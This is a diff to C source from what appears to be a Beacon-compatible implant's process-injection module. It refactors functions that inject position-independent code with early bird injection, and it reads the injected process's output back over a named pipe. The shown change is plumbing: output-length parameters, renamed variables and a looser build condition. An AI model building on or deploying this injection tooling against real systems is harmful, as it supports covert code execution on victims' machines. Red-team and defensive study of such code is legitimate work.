@@ -6,7 +6,7 @@
 #include "BeaconCompatibility.h"
 
 /* This file requires the COFF loader for Process Injection Kit capabilities */
-#if defined(INCLUDE_CMD_INJECT_SHELLCODE) && defined(INCLUDE_CMD_INLINE_EXECUTE)
+#if defined(INCLUDE_CMD_INJECT_SHELLCODE) || defined(INCLUDE_CMD_INLINE_EXECUTE)
 
 /**
  * @brief Inject PIC using default technique (early bird injection)
@@ -15,12 +15,12 @@
  * @param[inout] 
  * @return BOOL
  */
-BOOL InjectDefault(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _Out_ PCHAR* outData)
+BOOL InjectDefault(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _Out_ PCHAR* outData, _Out_ SIZE_T* outLen)
 {
 	BOOL   Status  = FALSE;
 	HANDLE hPipe   = NULL;
 	PCHAR  output  = NULL;
-	DWORD  outLen  = 0;
+	DWORD  Length  = 0;
 	OVERLAPPED ov  = { 0 };
 
     ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
@@ -39,15 +39,16 @@ BOOL InjectDefault(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _Out_ PCHAR* outDat
 	Sleep(3000);
 
 	/* Read any stdin/stderr from injected process */
-	if (!ReadNamedPipe(hPipe, &output, &outLen)) {
+	if (!ReadNamedPipe(hPipe, &output, &Length)) {
 		_err("[-] No output or read failed\n");
 		goto END;
 	}
 
-	_dbg("[+] Received %lu bytes of output", outLen);
-	_dbg("%.*s\n", outLen, output);  // if it's printable
+	_dbg("[+] Received %lu bytes of output", Length);
+	_dbg("%.*s\n", Length, output);  // if it's printable
 
 	*outData = output;
+	*outLen  = Length; 
 
 	Status = TRUE;
 
@@ -67,12 +68,12 @@ END:
  * @param[inout] 
  * @return BOOL
  */
-BOOL InjectCustomKit(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _In_ PCHAR InjectKit, _In_ SIZE_T kitLen, _Out_ PCHAR* outData)
+BOOL InjectCustomKit(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _In_ PCHAR InjectKit, _In_ SIZE_T kitLen, _Out_ PCHAR* outData, _Out_ SIZE_T* outLen)
 {
 	BOOL   Status  = FALSE;
 	HANDLE hPipe   = NULL;
 	PCHAR  output  = NULL;
-	DWORD  outLen  = 0;
+	DWORD  Length  = 0;
 	OVERLAPPED ov  = { 0 };
 
     ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
@@ -115,18 +116,18 @@ BOOL InjectCustomKit(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _In_ PCHAR Inject
 
  
 	/* Read any stdin/stderr from injected process */
-	if (!ReadNamedPipe(hPipe, &output, &outLen)) {
+	if (!ReadNamedPipe(hPipe, &output, &Length)) {
 		_err("[-] No output or read failed\n");
 		goto END;
 	}
 
 
-	_dbg("[+] Received %lu bytes of output", outLen);
-	_dbg("%.*s\n", outLen, output);  // if it's printable
+	_dbg("[+] Received %lu bytes of output", Length);
+	_dbg("%.*s\n", Length, output);  // if it's printable
 
 
 	/* Combine BOF output and named pipe output */
-	DWORD totalLen = BofOutLen + outLen;
+	DWORD totalLen = BofOutLen + Length;
 	PCHAR finalOutput = (PCHAR)malloc(totalLen + 1);
 	if (finalOutput == NULL) {
 		_err("[-] Failed to allocate memory for final output");
@@ -134,10 +135,11 @@ BOOL InjectCustomKit(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _In_ PCHAR Inject
 	}
 
 	memcpy(finalOutput, BofOutBuf, BofOutLen);
-	memcpy(finalOutput + BofOutLen, output, outLen);
+	memcpy(finalOutput + BofOutLen, output, Length);
 	finalOutput[totalLen] = '\0';
 
 	*outData = finalOutput;
+	*outLen  = totalLen;
 
 	Status = TRUE;
 
